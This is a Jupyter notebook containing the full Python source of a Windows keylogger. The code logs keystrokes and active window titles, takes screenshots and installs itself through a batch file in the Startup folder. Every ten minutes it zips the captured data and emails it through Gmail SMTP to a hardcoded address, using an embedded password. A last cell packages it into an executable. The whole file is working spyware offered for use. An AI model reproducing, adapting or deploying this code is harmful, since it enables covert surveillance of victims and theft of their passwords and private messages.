
# coding: utf-8

# In[ ]:


#This is a keylogger which will record the keypresses as well as take periodically screenshot. 
from pynput.keyboard import Key, Listener
from win32gui import GetWindowText, GetForegroundWindow
from multiprocessing import Process
#from PIL import ImageGrab
from mss import mss
import os
#from pynput.mouse import Button, Controller
import shutil
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import datetime
import time
# now and now1 are for files' names 
now = datetime.datetime.now().strftime("%I:%M %p")
now1 = datetime.datetime.now().strftime("%I %M  %p")
#today_date is the name of the directory in whice the program will save the data
from datetime import datetime
todays_date = datetime.now().strftime('%Y-%b-%d')
#the lines and the function down are for making the program into the startup file, so it work automatically when startup.
#the function will make a batch file of the program and copy it into the startup file, it name will be open.bat >.
try:
    shutil.rmtree("D:\\EWin")
except FileNotFoundError:
    pass
import getpass
#This code is to make search for the meant file once it downloaded and than put it in the startup directory.
for root,dirs,files in os.walk("C:\\"):
    for file in files:
        if file.endswith("Winsercon0-1W.ipynb"):
            s = (os.path.join(root,file))
        

USER_NAME = getpass.getuser()
def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)

        
        
for root,dirs,files in os.walk("C:\\Users\\"+USER_NAME+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"):
    for file in files:
        if  not file.endswith("open.bat"):
            add_to_startup(s)


#These lines are for creating some dirctoris to put the data in
#the data are going to be saved in "C:\\EWin\\todays_date"

try:
    os.chdir("D:\\")
    os.mkdir("EWin")
except FileExistsError:
    os.chdir("D:\\EWin")

    try:
        os.mkdir(todays_date)
        os.chdir("D:\\EWin\\"+todays_date+"")

        try:
            os.mkdir("keylogger")
            os.chdir("D:\\EWin\\"+todays_date+"\\keylogger")


        except FileExistsError:           
            os.chdir("D:\\EWin\\"+todays_date+"\\keylogger")

            try:
                os.mkdir("Pics")
                os.chdir("D:\\EWin\\"+todays_date+"keylogger\\Pics")

            except FileExistsError:
                os.chdir("D:\\EWin\\"+todays_date+"keylogger\\Pics")
        else:
            os.mkdir("Pics")
            
    except FileExistsError:           
        os.chdir("D:\\EWin\\"+todays_date+"")

        try:
            os.mkdir("keylogger")
            os.chdir("D:\\EWin\\"+todays_date+"\\keylogger")

        except FileExistsError:
            os.chdir("D:\\EWin\\"+todays_date+"\\keylogger")

            try:
                os.mkdir("Pics")
                os.chdir("D:\\EWin\\"+todays_date+"\\keylogger\\Pics")

            except FileExistsError:
                os.chdir("D:\\EWin\\"+todays_date+"\\keylogger\\Pics")

        else:
            os.mkdir("Pics")
    
else:
    os.chdir("D:\\EWin")
    os.mkdir(todays_date)
    os.chdir("D:\\EWin\\"+todays_date+"")
    os.mkdir("keylogger")
    os.chdir("D:\\EWin\\"+todays_date+"\\keylogger")
    os.mkdir("Pics")

finally:
    os.chdir("D:\\EWin\\"+todays_date+"\\keylogger\\Pics")



#now0 is needed for renaming the directory or the file. file_name is the name of the file 
#in which keypresses will be apended.  

now0 = datetime.now().strftime('%Y %b %d')
todays_date = datetime.now().strftime('%Y-%b-%d')

written = []
z=1
z1 = 1
#this line for getting the window which the used is using
current = GetWindowText(GetForegroundWindow())
pics = "D:\\Ewin\\"+todays_date+"\\keylogger\\Pics\\"

#halfanhour is the time by which the program will compress the data and send it to the email
halfanhour = time.time()+600

#at the begining:the program will take a screenshot and will append the name of the window the user is using

file_name = 'D:\\EWin\\'+todays_date +"\\keylogger\\"+ todays_date + '.txt'
todays_file = open(file_name, 'a') 
todays_file.write(now+'\n') 
todays_file.write(current+'\n')
todays_file.close()
os.chdir(pics)
with mss() as ms:
    filename = ms.shot( output=str(now0)+" "+str(now1)+str(0)+".jpg")
           

#This is the main function of the program and it is called rep (repeate) because it will be repeated with every key press.
def rep(key):
    global z1
    global halfanhour
    global written
    global z
    global current
    global now        
    global EWin
    global file_name
#The line below is for replacing the name of the key into its function. i.g. <Key.enter: <13>>'into '\n' and so on.

    e = str(written)
    e = e.replace("'",'')
    e = e.replace(',','')
    e = e.replace('[','')
    e = e.replace(']','')
    e = e.replace('<Key.esc: <27>>','\n Stopping\n Stopping\n Stopping\n')
    e = e.replace('<Key.space:  >',' ')
    e = e.replace('<Key.enter: <13>>','\n')
    e = e.replace('<Key.shift_r: <161>><Key.alt_r: <165>>',' (Language changed) ')
    e = e.replace('<Key.backspace: <8>>','"@!@"')
    e = e.replace('<Key.shift_r: <161>>','"SHIFT"')
    e = e.replace('<Key.down: <40>>','"^*"')
    e = e.replace('<Key.up: <38>>','^')
    e = e.replace('<Key.right: <39>>','>')
    e = e.replace('<Key.left: <37>>','<')
        
#appending the pressed key into the file after editing it.
#it will append the name of the window that the user uses, once the time changes or the used window is changed.
    os.chdir(pics)
    with mss() as ms:
        filename = ms.shot( output=str(now0)+" "+str(now1)+str(0)+".jpg")
    import datetime
    todays_file = open(file_name, 'a') 
    if now != datetime.datetime.now().strftime("%I:%M %p"):
        todays_file.write('\n'+datetime.datetime.now().strftime("%I:%M: %p")+'\n')
    if current != GetWindowText(GetForegroundWindow()): 
        todays_file.write('\n'+GetWindowText(GetForegroundWindow())+'\n')
    
    todays_file.write(e) 
    todays_file.close() 
    
        
    if now != datetime.datetime.now().strftime("%I:%M %p") or current != GetWindowText(GetForegroundWindow()): 
        zz=str(z)
        os.chdir(pics)
        with mss() as ms:
            filename = ms.shot( output=str(now0)+" "+str(now1)+zz+".jpg")
        z+=1
           
        
        
        
    
    written = []
    current = GetWindowText(GetForegroundWindow())
    now = datetime.datetime.now().strftime("%I:%M %p")
    from datetime import datetime
    
#for compressing the file and send it to the meant email every ten minutes.    
    if time.ctime(halfanhour) <= time.ctime():
##A code in case the user do not have an internet connection.
        try: 
        
            za = str(z1)
            os.chdir("D:\\Ewin")
            shutil.make_archive(todays_date+za,'zip', "D:\\Ewin\\"+todays_date)
            halfanhour = time.time()+600
            z1+=1
    
            
    
            fromaddr = "ff792680@gmail.com"
            toaddr = "ff792680@gmail.com"
            
            msg = MIMEMultipart()
    
            msg['From'] = fromaddr
            msg['To'] = toaddr
            msg['Subject'] = todays_date
    
            body = todays_date+str(now)
            msg.attach(MIMEText(body, 'plain'))
    
            filename = todays_date+za
            attachment = open("D:\\Ewin\\"+todays_date+za+".zip", "rb")
    
            part = MIMEBase('application', 'octet-stream')
            part.set_payload((attachment).read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
            msg.attach(part)

            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(fromaddr, "togetyour5a5a")
            text = msg.as_string()
            server.sendmail(fromaddr, toaddr, text)
            server.quit()

    
    
    
    
        # it will wait more ten minute then will retry.        
        except:
            halfanhour = time.time()+400           

            
#this function will call rep() every time a key is pressed.
def on_press(key):
    global written
    written.append(key)
    rep(key)    

with Listener(
        on_press=on_press) as listener:
    listener.join()


# In[1]:


get_ipython().system('auto-py-to-exe')


# In[ ]:




